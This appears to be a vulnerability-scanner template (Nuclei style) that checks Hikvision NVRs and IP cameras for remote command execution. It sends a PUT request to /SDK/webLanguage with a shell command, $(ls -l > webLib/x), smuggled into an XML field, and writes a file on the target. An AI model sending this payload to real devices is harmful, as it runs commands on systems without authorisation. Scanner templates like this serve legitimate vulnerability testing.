id: hivision_NVR_RCE

info:
  name: 海康威视_NVR_IP摄像头
  author: str1am
  severity: critical
  tags: hikvision,rce

requests:
  - raw:
      - |
        PUT /SDK/webLanguage HTTP/1.1
        Host: {{Hostname}}
        X-Requested-With: XMLHttpRequest
        Content-Type: application/x-www-form-urlencoded

        <?xml version='1.0' encoding='UTF-8'?><language>$(ls -l > webLib/x)</language>
   
    matchers-condition: and
    matchers:
      - type: status
        status: 
          - 500